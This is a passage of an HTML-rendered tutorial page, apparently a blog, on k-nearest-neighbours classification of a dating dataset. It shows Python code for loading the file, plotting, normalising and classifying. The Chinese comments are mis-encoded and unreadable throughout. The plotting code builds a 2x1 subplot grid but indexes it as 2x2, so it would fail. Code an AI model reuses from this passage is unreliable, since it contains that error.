class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib.font_manager <span class="keyword">import</span> FontProperties</span><br><span class="line"><span class="keyword">import</span> matplotlib.lines <span class="keyword">as</span> mlines</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file2matrix</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filename) <span class="keyword">as</span> fr:</span><br><span class="line">        <span class="comment"># è¯»å–æ•°æ®é›†</span></span><br><span class="line">        array0Lines = fr.readlines()</span><br><span class="line">        <span class="comment"># æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ®</span></span><br><span class="line">        numberOfLines = len(array0Lines)</span><br><span class="line">        <span class="comment"># ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼</span></span><br><span class="line">        returnMat = np.zeros((numberOfLines, <span class="number">3</span>))</span><br><span class="line">        <span class="comment"># åˆ†ç±»æ ‡ç­¾å‘é‡</span></span><br><span class="line">        classLableVector = []</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> array0Lines:</span><br><span class="line">            <span class="comment"># åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾</span></span><br><span class="line">            listFromLine = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="comment"># å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ</span></span><br><span class="line">            returnMat[index, :] = listFromLine[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">            <span class="comment"># å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º</span></span><br><span class="line">            label = listFromLine[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> label == <span class="string">&#x27;didntLike&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span class="string">&#x27;smallDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span class="string">&#x27;largeDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">3</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> returnMat, classLableVector</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showdatas</span>(<span class="params">datingDataMat, datingLabels</span>):</span></span><br><span class="line">    <span class="comment"># è®¾ç½®ä¸­æ–‡å­—ä½“æ ¼å¼</span></span><br><span class="line">    font = FontProperties(fname=<span class="string">r&#x27;C:\Windows\Fonts\simsun.ttc&#x27;</span>, size=<span class="number">14</span>)</span><br><span class="line">    <span class="comment"># å°†ä¸€ä¸ªç”»å¸ƒåˆ†ä¸º4ä»½ï¼Œä¸å…±äº«xè½´å’Œyè½´ï¼Œå¤§å°ä¸º(13, 8)</span></span><br><span class="line">    fig, axs = plt.subplots(nrows=<span class="number">2</span>, ncols=<span class="number">1</span>, sharex=<span class="literal">False</span>, sharey=<span class="literal">False</span>, figsize=(<span class="number">13</span>, <span class="number">8</span>))</span><br><span class="line">    numberOfLabels = len(datingLabels)</span><br><span class="line">    LabelsColor = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> datingLabels:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            LabelsColor.append(<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">            LabelsColor.append(<span class="string">&#x27;orange&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">            LabelsColor.append(<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”»å‡ºæ•£ç‚¹å›¾,ä»¥datingDataMatçŸ©é˜µçš„ç¬¬ä¸€(é£è¡Œå¸¸å®¢ä¾‹ç¨‹)ã€ç¬¬äºŒåˆ—(ç©æ¸¸æˆ)æ•°æ®ç”»æ•£ç‚¹æ•°æ®,æ•£ç‚¹å¤§å°ä¸º15,é€æ˜åº¦ä¸º0.5</span></span><br><span class="line">    axs[<span class="number">0</span>][<span class="number">0</span>].scatter(x=datingDataMat[:, <span class="number">0</span>], y=datingDataMat[:, <span class="number">1</span>], color=LabelsColor, s=<span class="number">15</span>, alpha=<span class="number">.5</span>)</span><br><span class="line">    axs0_title_text = axs[<span class="number">0</span>][<span class="number">0</span>].set_title(<span class="string">u&#x27;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°ä¸ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´å æ¯”&#x27;</span>, FontProperties=font)</span><br><span class="line">    axs0_xlabel_text = axs[<span class="number">0</span>][<span class="number">0</span>].set_xlabel(<span class="string">u&#x27;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°&#x27;</span>, FontProperties=font)</span><br><span class="line">    axs0_ylabel_text = axs[<span class="number">0</span>][<span class="number">0</span>].set_ylabel(<span class="string">u&#x27;ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´å æ¯”&#x27;</span>, FontProperties=font)</span><br><span class="line">    plt.setp(axs0_title_text, size=<span class="number">9</span>, weight=<span class="string">&#x27;bold&#x27;</span>, color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    plt.setp(axs0_xlabel_text, size=<span class="number">8</span>, weight=<span class="string">&#x27;bold&#x27;</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">    plt.setp(axs0_ylabel_text, size=<span class="number">8</span>, weight=<span class="string">&#x27;bold&#x27;</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”»å‡ºæ•£ç‚¹å›¾,ä»¥datingDataMatçŸ©é˜µçš„ç¬¬ä¸€(é£è¡Œå¸¸å®¢ä¾‹ç¨‹)ã€ç¬¬ä¸‰åˆ—(å†°æ¿€å‡Œ)æ•°æ®ç”»æ•£ç‚¹æ•°æ®,æ•£ç‚¹å¤§å°ä¸º15,é€æ˜åº¦ä¸º0.5</span></span><br><span class="line">    axs[<span class="number">0</span>][<span class="number">1</span>].scatter(x=datingDataMat[:, <span class="number">0</span>], y=datingDataMat[:, <span class="number">2</span>], color=LabelsColor, s=<span class="number">15</span>, alpha=<span class="number">.5</span>)</span><br><span class="line">    axs0_title_text = axs[<span class="number">0</span>][<span class="number">1</span>].set_title(<span class="string">u&#x27;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°ä¸æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°&#x27;</span>, FontProperties=font)</span><br><span class="line">    axs0_xlabel_text = axs[<span class="number">0</span>][<span class="number">1</span>].set_xlabel(<span class="string">u&#x27;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°&#x27;</span>, FontProperties=font)</span><br><span class="line">    axs0_ylabel_text = axs[<span class="number">0</span>][<span class="number">1</span>].set_ylabel(<span class="string">u&#x27;æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°&#x27;</span>, FontProperties=font)</span><br><span class="line">    plt.setp(axs0_title_text, size=<span class="number">9</span>, weight=<span class="string">&#x27;bold&#x27;</span>, color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    plt.setp(axs0_xlabel_text, size=<span class="number">8</span>, weight=<span class="string">&#x27;bold&#x27;</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">    plt.setp(axs0_ylabel_text, size=<span class="number">8</span>, weight=<span class="string">&#x27;bold&#x27;</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”»å‡ºæ•£ç‚¹å›¾,ä»¥datingDataMatçŸ©é˜µçš„ç¬¬äºŒ(ç©æ¸¸æˆ)ã€ç¬¬ä¸‰åˆ—(å†°æ¿€å‡Œ)æ•°æ®ç”»æ•£ç‚¹æ•°æ®,æ•£ç‚¹å¤§å°ä¸º15,é€æ˜åº¦ä¸º0.5</span></span><br><span class="line">    axs[<span class="number">1</span>][<span class="number">0</span>].scatter(x=datingDataMat[:, <span class="number">1</span>], y=datingDataMat[:, <span class="number">2</span>], color=LabelsColor, s=<span class="number">15</span>, alpha=<span class="number">.5</span>)</span><br><span class="line">    axs0_title_text = axs[<span class="number">1</span>][<span class="number">0</span>].set_title(<span class="string">u&#x27;ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´å æ¯”ä¸æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°&#x27;</span>, FontProperties=font)</span><br><span class="line">    axs0_xlabel_text = axs[<span class="number">1</span>][<span class="number">0</span>].set_xlabel(<span class="string">u&#x27;ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´å æ¯”&#x27;</span>, FontProperties=font)</span><br><span class="line">    axs0_ylabel_text = axs[<span class="number">1</span>][<span class="number">0</span>].set_ylabel(<span class="string">u&#x27;æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°&#x27;</span>, FontProperties=font)</span><br><span class="line">    plt.setp(axs0_title_text, size=<span class="number">9</span>, weight=<span class="string">&#x27;bold&#x27;</span>, color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    plt.setp(axs0_xlabel_text, size=<span class="number">8</span>, weight=<span class="string">&#x27;bold&#x27;</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">    plt.setp(axs0_ylabel_text, size=<span class="number">8</span>, weight=<span class="string">&#x27;bold&#x27;</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½®å›¾ä¾‹</span></span><br><span class="line">    didntLike = mlines.Line2D([], [], color=<span class="string">&#x27;black&#x27;</span>, marker=<span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">                              markersize=<span class="number">6</span>, label=<span class="string">&#x27;didntLike&#x27;</span>)</span><br><span class="line">    smallDoses = mlines.Line2D([], [], color=<span class="string">&#x27;orange&#x27;</span>, marker=<span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">                               markersize=<span class="number">6</span>, label=<span class="string">&#x27;smallDoses&#x27;</span>)</span><br><span class="line">    largeDoses = mlines.Line2D([], [], color=<span class="string">&#x27;red&#x27;</span>, marker=<span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">                               markersize=<span class="number">6</span>, label=<span class="string">&#x27;largeDoses&#x27;</span>)</span><br><span class="line">    <span class="comment"># æ·»åŠ å›¾ä¾‹</span></span><br><span class="line">    axs[<span class="number">0</span>][<span class="number">0</span>].legend(handles=[didntLike, smallDoses, largeDoses])</span><br><span class="line">    axs[<span class="number">0</span>][<span class="number">1</span>].legend(handles=[didntLike, smallDoses, largeDoses])</span><br><span class="line">    axs[<span class="number">1</span>][<span class="number">0</span>].legend(handles=[didntLike, smallDoses, largeDoses])</span><br><span class="line">    <span class="comment"># æ˜¾ç¤ºå›¾ç‰‡</span></span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filename = <span class="string">&#x27;datingTestSet.txt&#x27;</span></span><br><span class="line">    datingDataMat, datingLabels = file2matrix(filename)</span><br><span class="line">    showdatas(datingDataMat, datingLabels)</span><br></pre></td></tr></table></figure><p>ç»˜åˆ¶ç»“æœï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200906152851.png" alt=""></p><p>ä»ç¬¬ä¸€å¼ å›¾å¯ä»¥çœ‹åˆ°åˆ†ç±»æ•ˆæœæ¯”è¾ƒæ˜æ˜¾ï¼Œå¾ˆç›´è§‚çš„å‘ç°æ•°æ®çš„è§„å¾‹ã€‚</p><h3 id="æ•°æ®å¤„ç†">æ•°æ®å¤„ç†</h3><p>å½’ä¸€åŒ–æ•°æ® ï¼ˆå½’ä¸€åŒ–æ˜¯ä¸€ä¸ªè®©æƒé‡å˜ä¸ºç»Ÿä¸€çš„è¿‡ç¨‹ï¼Œæ›´å¤šç»†èŠ‚è¯·å‚è€ƒ: <a href="https://www.zhihu.com/question/19951858">https://www.zhihu.com/question/19951858</a> ï¼‰</p><table><thead><tr><th>åºå·</th><th>ç©è§†é¢‘æ¸¸æˆæ‰€è€—æ—¶é—´ç™¾åˆ†æ¯”</th><th>æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°</th><th>æ¯å‘¨æ¶ˆè´¹çš„å†°æ·‡æ·‹å…¬å‡æ•°</th><th>æ ·æœ¬åˆ†ç±»</th></tr></thead><tbody><tr><td>1</td><td>0.8</td><td>400</td><td>0.5</td><td>1</td></tr><tr><td>2</td><td>12</td><td>134 000</td><td>0.9</td><td>3</td></tr><tr><td>3</td><td>0</td><td>20 000</td><td>1.1</td><td>2</td></tr><tr><td>4</td><td>67</td><td>32 000</td><td>0.1</td><td>2</td></tr></tbody></table><p>æ ·æœ¬3å’Œæ ·æœ¬4çš„è·ç¦»: $$\sqrt{(0-67)^2 + (20000-32000)^2 + (1.1-0.1)^2 }$$</p><p>å½’ä¸€åŒ–ç‰¹å¾å€¼ï¼Œæ¶ˆé™¤ç‰¹å¾ä¹‹é—´é‡çº§ä¸åŒå¯¼è‡´çš„å½±å“ã€‚</p><p>ç¼–å†™åä¸ºautoNormçš„å‡½æ•°ï¼Œç”¨è¯¥å‡½æ•°è‡ªåŠ¨å°†æ•°æ®å½’ä¸€åŒ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib.font_manager <span class="keyword">import</span> FontProperties</span><br><span class="line"><span class="keyword">import</span> matplotlib.lines <span class="keyword">as</span> mlines</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file2matrix</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filename) <span class="keyword">as</span> fr:</span><br><span class="line">        <span class="comment"># è¯»å–æ•°æ®é›†</span></span><br><span class="line">        array0Lines = fr.readlines()</span><br><span class="line">        <span class="comment"># æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ®</span></span><br><span class="line">        numberOfLines = len(array0Lines)</span><br><span class="line">        <span class="comment"># ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼</span></span><br><span class="line">        returnMat = np.zeros((numberOfLines, <span class="number">3</span>))</span><br><span class="line">        <span class="comment"># åˆ†ç±»æ ‡ç­¾å‘é‡</span></span><br><span class="line">        classLableVector = []</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> array0Lines:</span><br><span class="line">            <span class="comment"># åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾</span></span><br><span class="line">            listFromLine = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="comment"># å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ</span></span><br><span class="line">            returnMat[index, :] = listFromLine[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">            <span class="comment"># å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º</span></span><br><span class="line">            label = listFromLine[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> label == <span class="string">&#x27;didntLike&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span class="string">&#x27;smallDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span class="string">&#x27;largeDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">3</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> returnMat, classLableVector</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoNorm</span>(<span class="params">dataSet</span>):</span></span><br><span class="line">    <span class="comment"># è·å–æ•°æ®çš„æœ€å€¼</span></span><br><span class="line">    minVals = dataSet.min(<span class="number">0</span>)</span><br><span class="line">    maxVals = dataSet.max(<span class="number">0</span>)</span><br><span class="line">    ranges = maxVals - minVals</span><br><span class="line">    <span class="comment"># ä¸dataSetç›¸åŒå¤§å°çš„é›¶çŸ©é˜µ</span></span><br><span class="line">    normDataSet = np.zeros(np.shape(dataSet))</span><br><span class="line">    <span class="comment"># è¿”å›dataSetçš„è¡Œæ•°</span></span><br><span class="line">    m = dataSet.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># åŸå§‹å€¼å‡å»æœ€å°å€¼</span></span><br><span class="line">    normDataSet = dataSet - np.tile(minVals, (m, <span class="number">1</span>))</span><br><span class="line">    <span class="comment"># é™¤ä»¥æœ€å¤§å’Œæœ€å°å€¼çš„å·®ï¼Œå¾—åˆ°å½’ä¸€åŒ–æ•°æ®</span></span><br><span class="line">    normDataSet = normDataSet / np.tile(ranges, (m, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> normDataSet, ranges, minVals</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filename = <span class="string">&#x27;datingTestSet.txt&#x27;</span></span><br><span class="line">    datingDataMat, datingLabels = file2matrix(filename)</span><br><span class="line">    normDataSet, ranges, minVals = autoNorm(datingDataMat)</span><br><span class="line">    print(normDataSet)</span><br><span class="line">    print(ranges)</span><br><span class="line">    print(minVals)</span><br></pre></td></tr></table></figure><p>è¿”å›ç»“æœï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200906160525.png" alt=""></p><h3 id="éªŒè¯åˆ†ç±»å™¨">éªŒè¯åˆ†ç±»å™¨</h3><p>ä¸ºäº†æµ‹è¯•åˆ†ç±»å™¨æ•ˆæœï¼Œåˆ›å»ºå‡½æ•°datingClassTestï¼Œä½¿ç”¨å·²æœ‰æ•°æ®çš„90%ä½œä¸ºè®­ç»ƒæ ·æœ¬æ¥è®­ç»ƒåˆ†ç±»å™¨ï¼Œè€Œä½¿ç”¨å…¶ä½™çš„10%æ•°æ®å»æµ‹è¯•åˆ†ç±»å™¨ï¼Œæ£€æµ‹åˆ†ç±»å™¨çš„æ­£ç¡®ç‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify0</span>(<span class="params">inX, dataSet, labels, k</span>):</span></span><br><span class="line">    <span class="comment"># è·å–dataSizeçš„è¡Œæ•°</span></span><br><span class="line">    dataSize = dataSet.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># è®¡ç®—inXä¸dataSetæ¯ä¸ªç‚¹çš„æ¨ªçºµåæ ‡çš„å·®å€¼</span></span><br><span class="line">    diffMat = np.tile(inX, (dataSize, <span class="number">1</span>)) - dataSet</span><br><span class="line">    <span class="comment"># å¹³æ–¹</span></span><br><span class="line">    sqDiffMat = diffMat**<span class="number">2</span></span><br><span class="line">    <span class="comment"># sum()æ‰€æœ‰å…ƒç´ ç›¸åŠ ï¼Œsum(0)åˆ—ç›¸åŠ ï¼Œsum(1)è¡Œç›¸åŠ </span></span><br><span class="line">    sqDistances = sqDiffMat.sum(axis=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># å¼€æ–¹</span></span><br><span class="line">    distances = sqDistances**<span class="number">0.5</span></span><br><span class="line">    <span class="comment"># è¿”å›distancesä¸­å…ƒç´ ä»å°åˆ°å¤§æ’åºåçš„ç´¢å¼•å€¼</span></span><br><span class="line">    sortedDistIndices = distances.argsort()</span><br><span class="line">    <span class="comment"># è®°å½•ç±»åˆ«æ¬¡æ•°çš„å­—å…¸</span></span><br><span class="line">    classCount = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="comment"># å–å‡ºæ’åºåçš„ç¬¬iä¸ªçš„ç‰¹å¾</span></span><br><span class="line">        voteIlabel = labels[sortedDistIndices[i]]</span><br><span class="line">        <span class="comment"># è®¡ç®—ç±»åˆ«æ¬¡æ•°</span></span><br><span class="line">        classCount[voteIlabel] = classCount.get(voteIlabel, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">    <span class="comment"># æ ¹æ®å­—å…¸çš„å€¼ï¼Œå³ç±»åˆ«æ¬¡æ•°è¿›è¡Œé™åºæ’åº</span></span><br><span class="line">    sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> sortedClassCount[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file2matrix</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filename) <span class="keyword">as</span> fr:</span><br><span class="line">        <span class="comment"># è¯»å–æ•°æ®é›†</span></span><br><span class="line">        array0Lines = fr.readlines()</span><br><span class="line">        <span class="comment"># æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ®</span></span><br><span class="line">        numberOfLines = len(array0Lines)</span><br><span class="line">        <span class="comment"># ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼</span></span><br><span class="line">        returnMat = np.zeros((numberOfLines, <span class="number">3</span>))</span><br><span class="line">        <span class="comment"># åˆ†ç±»æ ‡ç­¾å‘é‡</span></span><br><span class="line">        classLableVector = []</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> array0Lines:</span><br><span class="line">            <span class="comment"># åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾</span></span><br><span class="line">            listFromLine = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="comment"># å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ</span></span><br><span class="line">            returnMat[index, :] = listFromLine[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">            <span class="comment"># å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º</span></span><br><span class="line">            label = listFromLine[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> label == <span class="string">&#x27;didntLike&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span class="string">&#x27;smallDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span 